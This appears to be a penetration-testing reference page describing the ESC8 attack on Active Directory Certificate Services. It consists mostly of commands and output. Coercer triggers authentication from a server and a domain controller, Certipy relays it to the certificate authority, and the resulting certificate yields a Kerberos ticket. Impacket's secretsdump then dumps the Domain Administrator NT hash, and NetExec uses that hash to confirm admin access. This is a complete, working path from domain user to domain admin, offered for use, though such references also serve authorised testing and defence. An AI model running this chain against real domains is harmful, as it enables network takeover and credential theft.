---
title : "ESC8"
# pre : ' '
description : "ESC8 - Abuse Active Directory Certificate Services."
date : 2023-12-03T06:03:37+01:00
# hidden : true
# draft : true
weight : 20
# tags : ['']
---

---

ESC8 - Abuse Active Directory Certificate Services.

## Requirements

- [Coercer]({{< ref "tools/framework/coercer" >}})
- [Certipy]({{< ref "tools/other/certipy" >}})
- [Impacket]({{< ref "tools/framework/impacket" >}})
  - `secretsdump.py`
- [PKINITtools]({{< ref "tools/framework/pkinittools" >}})
  - `gettgtpkinit.py`
- [NetExec - optional]({{< ref "tools/framework/netexec" >}})

## Examples

### ESC8 from a 'random' server

**Note:** Start Certipy in relay mode before triggering authentication with Coercer.

#### Use Coercer.py to Trigger Authentication on a non-Domain Controller

- `-t` is the target server to trigger the authentication on
- `-l` is the listening host that is going to relay

```plain
$ sudo ./Coercer.py coerce -t 10.10.10.10 -u esc8-user@offsec.nl -l 10.10.10.11
Password:
[info] Starting coerce mode
[info] Scanning target 10.10.10.10
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49668,49669,49702,49710,49747
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.10.11\E4UAA0b\aa') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.10.11\OrF5Mwc2w\file.txt\x00') 
```

#### Certipy in Relay Mode

```plain
$ sudo certipy relay -target 'http://CA01.offsec.nl' -ca 'CA01.offsec.nl'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://CA01.offsec.nl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
OFFSEC\MGMT_SRV$
[*] Requesting certificate for 'OFFSEC\\MGMT_SRV$' based on the template 'Machine'
[*] Got certificate with DNS Host Name 'MGMT_SRV.offsec.nl'
[*] Certificate object SID is 'S-1-5-21-1234567890-123456789-09876543-56789'
[*] Saved certificate and private key to 'MGMT_SRV.pfx'
[*] Exiting...
```

### ESC8 from a Domain Controller

#### Use Coercer.py to Trigger Authentication on a Domain Controller

- `-t` is the target server to trigger the authentication on
- `-l` is the listening host that is going to relay

```plain
$ sudo ./Coercer.py coerce -t 10.10.10.10 -u esc8-user@offsec.nl -l 10.10.10.11
Password:
[info] Starting coerce mode
[info] Scanning target 10.10.10.10
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49668,49669,49702,49710,49747
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.10.11\E4UAA0b\aa') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.10.11\OrF5Mwc2w\file.txt\x00') 
```

#### Certipy in Relay Mode to Certificate Authority

```plain
$ sudo certipy relay -target 'http://CA01.offsec.nl' -ca 'CA01.offsec.nl' -template DomainController 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://CA01.offsec.nl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
OFFSEC\DC01$
[*] Requesting certificate for 'OFFSEC\\DC01$' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'DC01.offsec.nl'
[*] Certificate object SID is 'S-1-5-21-1234567890-123456789-09876543-56789'
[*] Saved certificate and private key to 'DC01.pfx'
[*] Exiting...
```

#### Get TGT from Certificate

```plain
$ python3 gettgtpkinit.py -cert-pfx ~/DC01.pfx "offsec.nl/DC01$" "DC01.ccache" -dc-ip 10.10.10.25
2023-12-08 16:18:33,939 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-12-08 04:20:13,042 minikerberos INFO     Requesting TGT'
INFO:minikerberos:Requesting TGT
2023-12-08 04:20:13,052 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-12-08 04:20:13,053 minikerberos INFO     12345678911
INFO:minikerberos:12345678911
2023-12-08 04:20:13,056 minikerberos INFO     Saved TGT to file
```

#### Secretsdump.py Extract Domain Administrator Hash

```plain
$ secretsdump.py -k 'offsec.nl/DC01$@DC01.offsec.nl' -debug -just-dc-user administrator -dc-ip 10.10.10.25
Impacket v0.10.0 - Copyright 2022 Fortra
Password:
[+] Using Kerberos Cache: DC01.ccache
[+] SPN CIFS/DC01.offsec.nl@offsec.nl not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/offsec.nl@offsec.nl
[+] Using TGT from cache
[+] Trying to connect to KDC at 10.10.10.25
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Trying to connect to KDC at 10.10.10.25
[+] Calling DRSCrackNames for administrator 
[+] Calling DRSGetNCChanges for {} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=OFFSEC,DC=local
offsec.nl\Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
[...]
[*] Cleaning up... 
```

#### NetExec Check Privileges

```plain
$ nxc smb 10.10.10.25 -u administrator -H :97f2592347d8fbe42be381726ff9ea83             
SMB         10.10.10.25  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.10.25  445    DC01             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
```

## URL list

- [Crowe.com - Exploiting AD CS: A quick look at ESC1 and ESC8](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8)
